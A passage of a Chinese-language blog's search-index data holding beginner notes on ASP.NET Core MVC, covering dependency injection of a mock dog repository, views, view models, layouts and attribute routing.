這樣編譯不會錯，這讓我很好奇。有空再整理筆記 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:5:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"新增 Model 新增Dog.cs。 在public class上面打///按 Enter，這邊可以得到下面結果。 namespace WebApplication3.Models { /// \u003csummary\u003e /// 狗的測試模型 /// \u003c/summary\u003e public class Dog { } } 在public class Dog裡面打上prop按下兩下Tab，可以快速設定屬性setter,getter。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:6:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"建立 Repository 這邊選擇介面。 namespace WebApplication3.Models { public interface IDogRepository { public Dog getDog(int id); } } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:7:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"建立 MockRepository 可用 ctor按下 tab 快速建立MockDogRepository建構函示，可以參考:C# 程式碼片段 - Visual Studio (Windows) | Microsoft Docs文章。 using System.Collections.Generic; namespace WebApplication3.Models { public class MockDogRepository : IDogRepository { private List\u003cDog\u003e _dogList; public MockDogRepository() { } public Dog getDog(int id) { throw new System.NotImplementedException(); } } } 最後再補上 Mock 資料。 using System.Collections.Generic; namespace WebApplication3.Models { public class MockDogRepository : IDogRepository { private List\u003cDog\u003e _dogList; public MockDogRepository() { _dogList = new List\u003cDog\u003e() { new Dog(){Id=1,Name =\"dog1\",Address=\"tw\"}, new Dog(){Id=2,Name =\"dog2\",Address=\"tw\"}, new Dog(){Id=3,Name =\"dog3\",Address=\"tw\"}, }; } public Dog getDog() { throw new System.NotImplementedException(); } } } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:8:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"Controller 依賴注入 DogRepository 依賴注入這邊跟 Laravel 很像，要完成下面動作做注入。 private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } using Microsoft.AspNetCore.Mvc; using WebApplication3.Models; namespace WebApplication3.Controllers { public class HomeController : Controller { private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } public string Index() { return _dogRepostory.getDog(1).Name; // return Json(new { a = \"1\", b = \"2\" }); } } } http://localhost:46201/home/index 程式運行發生錯誤 這邊不用太擔心，這邊是註冊容器，沒辦法入住DI。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:9:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"依賴注入 Tip 假如你有學過 Spring Boot 和 Laravel 的話應該對這個算滿熟悉。想當初我學 Laravel 第一次碰注入(DI)這個玩意也是看不太懂。這個有點跟類別static有點像，不需要再new出來。 首先你可能要知道依賴注入是要如何註冊的，Spring 依賴注入可以看我之前寫過這篇，因為Laravel 注入還沒學會，所以就沒深入他怎麼註冊的。回到重點，Net Core 依賴注入只有一種方法，都要去手動註冊，內鍵沒有自動注入，但使用第三方套件也能做到。 Warning 這個有點跟類別static有點像，不需要再new出來。 在使用上可能要了解注入物件的生命週期，通常 Scope 有分幾類，這個有時候會影響程式結果，比較常都用單例模式。這邊我工作上面很多都把這個當全域變數用，我覺得Helper相關類的可以用 static，但其實有些可以做到 static，像是 JWT 加密就可以直接用。 但有些會吃IConfiguration可以考慮用一個 Service 出來，把設定用上去，再把 Service注入IConfiguration再引用static Helper執行，這樣做程式分層架構可以更好去模組化。但這樣要寫很多類別，很多人都不會這樣做樣子… startup.cs public void ConfigureServices(IServiceCollection services) { services.AddMvc(options =\u003e options.EnableEndpointRouting = false); services.AddSingleton\u003cIDogRepository, MockDogRepository\u003e(); } 實作單例模式，才能正常運作。 http://localhost:46201/home/index ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:10:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"依賴注入種類 AddSingleton() AddTransient() AddScoped() ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:10:1","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"優點 低耦合 提供了高測試姓，使用測試單元更加容易。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:10:2","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"Controller JSON 範例 using Microsoft.AspNetCore.Mvc; using WebApplication3.Models; namespace WebApplication3.Controllers { public class HomeController : Controller { private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } public string Index() { return _dogRepostory.getDog(1).Name; // return Json(new { a = \"1\", b = \"2\" }); } public JsonResult Details() { Dog dog = _dogRepostory.getDog(1); return Json(dog); } } } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:11:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"看 HTTP 協議傳回格式 ObjectResult startup.cs public void ConfigureServices(IServiceCollection services) { services.AddMvc(options =\u003e options.EnableEndpointRouting = false).AddXmlSerializerFormatters(); services.AddSingleton\u003cIDogRepository, MockDogRepository\u003e(); } HomeControler.cs public ObjectResult Details() { Dog dog = _dogRepostory.getDog(1); return new ObjectResult(dog); } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:11:1","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"View public IActionResult Details() { Dog dog = _dogRepostory.getDog(1); return View(dog); } 這個錯誤會顯示默認 VIEW 三個路徑 /Views/Home/Details.cshtml /Views/Shared/Details.cshtml /Pages/Shared/Details.cshtml 除了一個一個加資料夾 也可以再 View 方法右鍵新增 View，按下新增檢視， Views/Home/Details(View) @{ ViewData[\"Title\"] = \"Details\"; } \u003ch1\u003eDetails\u003c/h1\u003e ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:12:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":".Net Core 5 建立檢視失敗可以參考(參考) c# - How to create MVC5 web project in visual studio 2022 - Stack Overflow ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:12:1","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"自訂義 View 發現 可以自訂View頁面，有下面三種方式。 View(\"Test\") =\u003e /Views/Home/Test View(\"~/Test/xxx.cshtml\"); =\u003e 絕對路徑 View(\"../../xxx\"); =\u003e 相對路徑，不用加 cshtml 推薦使用絕對路徑。 public virtual ViewResult View(); public virtual ViewResult View(string viewName, object model); public virtual ViewResult View(object model); public virtual ViewResult View(string viewName); ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:13:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"Controller 傳遞資料到 View 使用 ViewData 使用 ViewBag 強型別View ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:14:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"ViewData 是弱型別的字典(Dictonary)物件。 使用 string 型別的Key值，儲存和查詢 ViewData 字典中的資料 執行時動態解析 沒有智能感知，編譯時也沒有型別檢查 Controllers\\HomeController.cs public IActionResult Details() { Dog dog = _dogRepostory.getDog(1); ViewData[\"PageTitle\"] = \"Dog Details\"; ViewData[\"Dog\"] = dog; return View(dog); } Views\\Home\\Details.cshtml @using WebApplication3.Models \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003e@ViewData[\"PageTitle\"]\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch3\u003e@ViewData[\"PageTitle\"]\u003c/h3\u003e @{ var dog = ViewData[\"Dog\"] as Dog; } \u003cdiv\u003e 名稱：@dog.Name \u003c/div\u003e \u003cdiv\u003e 地址：@dog.Address \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:14:1","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"ViewBag ViewBag是ViewData的包裝器 它們都建立了一個弱型別的View ViewData使用字串Key來儲存和查詢資料 ViewBag使用動態屬性來儲存和查詢資料 均是在運釆時動態解析 均不是供編譯時型別檢查，沒有智能提示。 首選方法是使用強類別模型物件，將資料從控制器傳遞到View。 Views\\Home\\Details.cshtml public IActionResult Details() { Dog dog = _dogRepostory.getDog(1); ViewBag.PageTitle = \"Dog Details\"; ViewBag.Dog = dog; return View(dog); } Views\\Home\\Details.cshtml @using WebApplication3.Models \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003e@ViewBag.PageTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch3\u003e@ViewBag.PageTitle\u003c/h3\u003e \u003cdiv\u003e 名稱：@ViewBag.Dog.Name \u003c/div\u003e \u003cdiv\u003e 地址：@ViewBag.Dog.Address \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:14:2","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"強型別View 使用@model指另指定型別 使用@Model抓出物件屬性 強行別類型View提供編譯時類型檢查和智能提示 public IActionResult Details() { Dog dog = _dogRepostory.getDog(1); return View(dog); } @model WebApplication3.Models.Dog \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003e\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e 名稱：@Model.Name \u003c/div\u003e \u003cdiv\u003e 地址：@Model.Address \u003c/div\u003e @Model \u003c/body\u003e \u003c/html\u003e ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:14:3","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"ViewModel 視圖模型 模型物件無法滿足視圖所需的所有資料時，就需要使用 ViewModel了。 建立ViewModels資料夾，檔案以 *ViewModel.cs做結尾`。 HomeDetailsViewModel.cs using WebApplication3.Models; namespace WebApplication3.ViewModels { public class HomeDetailsViewModel { public string PageTitle { get; set; } public Dog Dog { get; set; } } } WebApplication3\\WebApplication3\\Controllers\\HomeController.cs public IActionResult Details() { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(1), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } WebApplication3\\WebApplication3\\Views\\Home\\Details.cshtml @model WebApplication3.ViewModels.HomeDetailsViewModel \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003e@Model.PageTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e 名稱：@Model.Dog.Name \u003c/div\u003e \u003cdiv\u003e 地址：@Model.Dog.Address \u003c/div\u003e @Model \u003c/body\u003e \u003c/html\u003e 總結小記: 新增 ViewModel 物件，設定好屬性。 Controler新增ViewModel，把這個物件傳到 View上面 View 使用 ViewModel物件。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:15:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"實現 List 視圖 WebApplication3\\WebApplication3\\Models\\IDogRepository.cs using System.Collections.Generic; namespace WebApplication3.Models { public interface IDogRepository { public Dog getDog(int id); // 新增 GetAllDogs public IEnumerable\u003cDog\u003e GetAllDogs(); } } WebApplication3\\WebApplication3\\Models\\MockDogRepository.cs using System.Collections.Generic; using System.Linq; namespace WebApplication3.Models { public class MockDogRepository : IDogRepository { private List\u003cDog\u003e _dogList; public MockDogRepository() { _dogList = new List\u003cDog\u003e() { new Dog(){Id=1,Name =\"dog1\",Address=\"tw\"}, new Dog(){Id=2,Name =\"dog2\",Address=\"tw\"}, new Dog(){Id=3,Name =\"dog2\",Address=\"tw\"}, }; } // 新增這個方法 public IEnumerable\u003cDog\u003e GetAllDogs() { return _dogList; } public Dog getDog(int id) { return _dogList.FirstOrDefault(a =\u003e a.Id == id); } } } WebApplication3\\WebApplication3\\Controllers\\HomeController.cs public IActionResult Index() { var model = _dogRepostory.GetAllDogs(); return View(model); } WebApplication3\\WebApplication3\\Views\\Home\\Index.cshtml @model IEnumerable\u003cWebApplication3.Models.Dog\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003e狗的清單\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ctable\u003e \u003ctr\u003e \u003cth\u003e序號\u003c/th\u003e \u003cth\u003e名稱\u003c/th\u003e \u003cth\u003e地址\u003c/th\u003e \u003c/tr\u003e @foreach (var dog in Model) { \u003ctr\u003e \u003ctd\u003e @dog.Id \u003c/td\u003e \u003ctd\u003e @dog.Name \u003c/td\u003e \u003ctd\u003e @dog.Address \u003c/td\u003e \u003c/tr\u003e } \u003c/table\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:16:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":".NET Core MVC 部局視圖 讓web應用程式中讓所有的視圖保持外觀一致性。布局檔案默認為_Layout.cshtml。通常放在(Views/Pages)/Shared資料夾。 在View或Page 建立 Shared 資料夾。 建立 Shared/_Layout.cshtml。 Shared/_Layout.cshtml \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003e@ViewBag.Title\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e @RenderBody() \u003c/body\u003e \u003c/html\u003e F:\\source\\repos\\WebApplication3\\WebApplication3\\Views\\Home\\Details.cshtml @model WebApplication3.ViewModels.HomeDetailsViewModel @{ Layout = \"~/Views/Shared/_Layout.cshtml\"; ViewBag.Title = @Model.PageTitle; } \u003cdiv\u003e 名稱：@Model.Dog.Name \u003c/div\u003e \u003cdiv\u003e 地址：@Model.Dog.Address \u003c/div\u003e @Model WebApplication3\\WebApplication3\\Views\\Home\\Index.cshtml @model IEnumerable\u003cWebApplication3.Models.Dog\u003e @{ Layout = \"~/Views/Shared/_Layout.cshtml\"; ViewBag.Title = \"狗的清單\"; } \u003ctable\u003e \u003ctr\u003e \u003cth\u003e序號\u003c/th\u003e \u003cth\u003e名稱\u003c/th\u003e \u003cth\u003e地址\u003c/th\u003e \u003c/tr\u003e @foreach (var dog in Model) { \u003ctr\u003e \u003ctd\u003e @dog.Id \u003c/td\u003e \u003ctd\u003e @dog.Name \u003c/td\u003e \u003ctd\u003e @dog.Address \u003c/td\u003e \u003c/tr\u003e } \u003c/table\u003e ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:17:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"布局頁面的結點(Sections) 提了一種方法讓某些頁面元素放在一起。可以強制性使用或者可選擇性使用。使用RenderSection()來呼叫 WebApplication3\\WebApplication3\\Views\\Shared_Layout.cshtml \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta name=\"viewport\" content=\"width=device-width\" /\u003e \u003ctitle\u003e@ViewBag.Title\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e @RenderBody() \u003c/div\u003e @RenderSection(\"Scripts\",required: false) \u003c/body\u003e \u003c/html\u003e 中間那一段@RenderSection(\"Scripts\",required: false)可以改寫 @if (IsSectionDefined(\"Scripts\")) { @RenderSection(\"Scripts\",required: false) } WebApplication3\\WebApplication3\\Views\\Home\\Details.cshtml @model WebApplication3.ViewModels.HomeDetailsViewModel @{ Layout = \"~/Views/Shared/_Layout.cshtml\"; ViewBag.Title = @Model.PageTitle; } \u003cdiv\u003e 名稱：@Model.Dog.Name \u003c/div\u003e \u003cdiv\u003e 地址：@Model.Dog.Address \u003c/div\u003e @Model @section Scripts{ \u003cscript src=\"~/js/site.js\"\u003e\u003c/script\u003e } 重點 @section Scripts{ \u003cscript src=\"~/js/site.js\"\u003e\u003c/script\u003e } 結果會顯示 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:18:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"_ViewStart.cshtml _ViewStart.cshtml程式碼會先在單個是途中先執行程式碼。減少了程式碼重複性。 新增時候選擇 建立在View資料夾 @{ Layout = \"~/Views/Shared/_Layout.cshtml\"; } 其他View屬性就不須指定_Layout。 也可以簡略寫成如下 @{ Layout = \"_Layout2\"; } 執行_ViewStart.cshtml順序如下圖，裡面的Home資料夾，依序先執行1，在執行2，依序後蓋前設定。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:19:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"_ViewImport.cshtml 上面我們寫的專案需要寫很長文字去讀取物件出來，如@model WebApplication3.ViewModels.HomeDetailsViewModel，_ViewImport.cshtml就是很好解決這個問題。 新增檔案建立到Views資料夾，參考下圖 WebApplication3\\WebApplication3\\Views_ViewImports.cshtml @using WebApplication3.Models; 我們在原有的View就可以不用寫前面的 namespace 簡單整理: 需使用@using指令包含公共命局空間 _ViewImports 文件還支持以下指令 @addTagHelper @removeTagHelper @tagHelperPrefix @model @inherits @inject ViewImports 文件支持分層讀取，這邊跟_ViewStart.cshtml一樣。1先讀2後讀，後蓋前設定。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:20:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"路由(Route) 預設路由 WebApplication3\\WebApplication3\\Startup.cs public void Configure(IApplicationBuilder app, IWebHostEnvironment env) { ... app.UseMvcWithDefaultRoute(); ... } 我們這邊可以看到使用 app.UseMvcWithDefaultRoute() 做預設路由。從下面註解可以看到預設規則。 這邊使用原本需要手動建立 router 規則。參考如下。 //app.UseMvcWithDefaultRoute(); app.UseMvc(routes =\u003e { routes.MapRoute(\"default\", \"{controller=Home}/{action=Index}/{id?}\"); }); 預設 Router 規則參照如下。 下面直接操作看看。 修改 HomeController.cs details 補上傳入 id 參數 public IActionResult Details(int id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } WebApplication3\\WebApplication3\\Controllers\\HomeController.cs using Microsoft.AspNetCore.Mvc; using WebApplication3.Models; using WebApplication3.ViewModels; namespace WebApplication3.Controllers { public class HomeController : Controller { private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } public IActionResult Index() { var model = _dogRepostory.GetAllDogs(); return View(model); } public IActionResult Details(int id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } } } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:21:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"屬性路由 使用屬性路由，我們使用Route()屬性定義路由。 屬性路由通常定義在Controller或Controller的方法上面 強制上層路由呼叫以/和~/來做設定。 這邊我們在Startup.cs先取消預設路由做測試。 這邊注意，我.NET Core 5 版本預設有 Page 資料夾，這邊建議先重新命名資料夾名稱，這樣就不會跟你的 Router 衝突到。 Startup.cs app.UseMvc(); WebApplication3\\WebApplication3\\Controllers\\HomeController.cs [Route(\"\")] [Route(\"Home\")] [Route(\"Home/Index\")] public IActionResult Index() { var model = _dogRepostory.GetAllDogs(); return View(model); } 查看結果: [Route(\"Home/Details/{id?}\")] public IActionResult Details(int id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } id空值會報錯！ [Route(\"Home/Details/{id?}\")] public IActionResult Details(int? id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id??1), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } 解決問題。 ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:22:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"Controller 跟 Router 命名不一樣 這邊看這兩張圖，發現他找View會找不到。 這邊就需要決斷路徑指定View，上面View有提到。 [Route(\"\")] [Route(\"Home\")] [Route(\"Home/Index\")] public IActionResult Index() { var model = _dogRepostory.GetAllDogs(); return View(\"~/Views/Home/Index.cshtml\",model); } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:22:1","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"Route 放置 Controller 上面 using Microsoft.AspNetCore.Mvc; using WebApplication3.Models; using WebApplication3.ViewModels; namespace WebApplication3.Controllers { [Route(\"Home\")] public class HomeController : Controller { private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } [Route(\"~/\")] [Route(\"\")] [Route(\"Index\")] public IActionResult Index() { var model = _dogRepostory.GetAllDogs(); return View(model); } [Route(\"Details/{id?}\")] public IActionResult Details(int? id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id??1), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } } } ","date":"2022-12-01","objectID":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/:23:0","tags":["di","mvc","net core","api","controller","view","repository"],"title":"NET Core MVC 入門操作筆記","uri":"/blog/posts/NET-Core-MVC-%E5%85%A5%E9%96%80%E6%93%8D%E4%BD%9C%E7%AD%86%E8%A8%98/"},{"categories":[".Net Core"],"content":"在自動調整方法 using Microsoft.AspNetCore.Mvc; using WebApplication3.Models; using WebApplication3.ViewModels; namespace WebApplication3.Controllers { [Route(\"[controller]\")] public class HomeController : Controller { private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } [Route(\"~/\")] [Route(\"\")] [Route(\"[action]\")] public IActionResult 